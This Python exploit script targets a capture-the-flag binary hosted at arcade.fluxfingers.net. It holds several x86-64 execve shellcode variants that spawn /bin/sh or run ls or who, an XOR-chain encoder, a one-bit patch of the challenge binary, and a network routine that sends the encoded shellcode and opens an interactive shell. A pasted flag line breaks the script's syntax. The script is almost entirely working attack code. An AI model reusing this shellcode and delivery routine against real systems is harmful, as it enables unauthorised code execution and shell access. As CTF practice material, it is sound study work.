#!/usr/bin/env python

from chdrft.cmds import CmdsList
from chdrft.main import app
from chdrft.utils.cmdify import ActionHandler
from chdrft.utils.misc import Attributize
import chdrft.utils.misc as cmisc
import glog
from chdrft.tube.connection import Connection
import binascii
from chdrft.emu.binary import  x64_mc
from chdrft.utils.fmt import Format

global flags, cache
flags = None
cache = None


def args(parser):
  clist = CmdsList().add(test).add(patch).add(shellcode)
  ActionHandler.Prepare(parser, clist.lst)



def shellcode(ctx):
  shellcode=b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

  shellcode=b'H1\xd2RH\xb8/bin/whoPH\x89\xe7RWH\x89\xe6H1\xc0\xb0;\x0f\x05'
  shellcode=b'PH1\xd2H1\xf6H\xbb/bin/ls\x00ST_\xb0;\x0f\x05'
  shellcode=b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05'
  shellcode=b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb0\x3b\x0f\x05'
  shellcode =b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
  @#flag{u_R_fl1ppin_good\o/keep_g0ing!}
  #shellcode=b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'


  print(shellcode)
 

  print(shellcode)

  start = 0xd7
  jmp_at = 0xbb+2+0x41
  shellcode+=b'\x00'*(jmp_at-start-len(shellcode))
  shellcode += bytes([0xeb, 0x100-(jmp_at+2-start)])
  def encode_shellcode(x):
    assert len(x) <= 0x2e
    res=  b'a'
    for i in x:
      res += bytes([res[-1] ^ i])
    res= Format(res).pad(0x2e, 0).v
    return res

  shellcode=encode_shellcode(shellcode)
  assert len(shellcode)<=0x2e
  open('./shellcode.out', 'wb').write(shellcode)

def test(ctx):
  shellcode = open('./shellcode.out', 'rb').read()


  with Connection('arcade.fluxfingers.net', 1807) as conn:
    addr = 0xbb+1
    bp = 3

    conn.send(f'{addr:x}\n')
    conn.send(f'{bp:x}\n')
    conn.recv_until('Enter the Key')
    assert len(shellcode) == 0x2e
    conn.send(shellcode)
    conn.interactive()




def patch(ctx):
  content = bytearray(open('./chall', 'rb').read())
  if 1 :
    addr = 0xbb+1
    bp = 3
    content[addr] ^= 1<< bp
    open('./chall.patched', 'wb').write(content)
  else:
    x64_mc.disp_ins(b'\xfe\xc1')
    x64_mc.disp_ins(b'\xb2\x2d')
    print(binascii.hexlify(x64_mc.get_disassembly('mov dh, 0x2e')))

def main():
  ctx = Attributize()
  ActionHandler.Run(ctx)


app()
